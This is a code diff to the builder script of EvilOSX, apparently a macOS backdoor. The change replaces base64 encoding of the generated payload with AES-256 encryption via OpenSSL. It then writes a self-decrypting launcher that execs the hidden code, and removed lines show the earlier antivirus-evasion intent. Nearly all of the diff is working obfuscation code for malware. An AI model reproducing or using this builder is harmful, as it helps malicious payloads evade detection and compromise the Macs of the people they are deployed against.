@@ -8,7 +8,6 @@ import os
 import random
 import string
 from sys import exit
-import base64
 
 MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
@@ -16,6 +15,7 @@ MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 
 def random_string(size, numbers=False):
+    """:return A randomly generate string of x characters."""
     name = ""
     for i in range(0, size):
         if not numbers:
@@ -23,6 +23,25 @@ def random_string(size, numbers=False):
         else:
             name += random.choice(string.ascii_letters + string.digits)
     return name
+
+
+def get_aes_key():
+    """:return A tuple containing the salt, key and IV."""
+    output = os.popen("openssl enc -aes-256-cbc -k %s -P -md sha256" % random_string(69, numbers=True)).read()
+    salt = ""
+    key = ""
+    iv = ""
+
+    for line in output.split("\n"):
+        line = line.replace(" ", "")
+
+        if line.startswith("salt="):
+            salt = line.split("=")[1]
+        elif line.startswith("key="):
+            key = line.split("=")[1]
+        elif line.startswith("iv="):
+            iv = line.strip().split("=")[1]
+    return salt, key, iv
 
 
 def main():
@@ -75,23 +94,32 @@ def main():
                 elif line.startswith("DISABLE_PERSISTENCE = "):
                     output_file.write("DISABLE_PERSISTENCE = %s\n" % disable_persistence)
                 else:
-                    if line.startswith("\"\"\"EvilOSX is a"):
-                        # Skip the description of EvilOSX, just in case anti-virus checks for this.
-                        pass
-                    else:
-                        output_file.write(line)
+                    output_file.write(line)
 
-        # Create the encoded launcher
-        with open(build_output, "r") as input_file, open("builds/tmp_file.py", "w+") as output_file:
-            encoded = base64.b64encode("".join(input_file.readlines()))
+        print MESSAGE_INFO + "Encrypting with AES 256 (using system OpenSSL)..."
+
+        # AES 256 encrypt the launcher
+        with open("builds/tmp_file.py", "w+") as output_file:
+            salt, key, iv = get_aes_key()
+
+            print "[DEBUG] Salt: " + salt
+            print "[DEBUG] Key: " + key
+            print "[DEBUG] IV: " + iv
+
+            encrypt_command = "cat %s | base64 | openssl aes-256-cbc -e -a -k %s -iv %s -S %s -md sha256" % (
+                build_output, key, iv, salt
+            )
+            encrypted = "".join(os.popen(encrypt_command).readlines()).replace("\n", "")
 
             output_file.write("#!/usr/bin/env python\n")  # The launch agent won't be able to run the script otherwise!
             output_file.write("# -*- coding: utf-8 -*-\n")
             output_file.write("# %s\n" % random_string(random.randint(10, 69), numbers=True))
-            output_file.write("import base64\n")
-            output_file.write("exec(base64.b64decode('%s'))\n" % encoded)
+            output_file.write("import os\n")
+            output_file.write("exec(\"\".join(os.popen(\"echo %s | openssl aes-256-cbc -A -d -a -k %s -iv %s -S %s -md sha256 | base64 --decode\").readlines()))\n" % (
+                encrypted, key, iv, salt
+            ))
 
-            # Switch out the unencoded file with the final encoded version.
+            # Replace the unencrypted file with the final encrypted version.
             os.rename("builds/tmp_file.py", build_output)
 
         print MESSAGE_INFO + "Done! Built file located at: %s" % os.path.realpath(build_output)
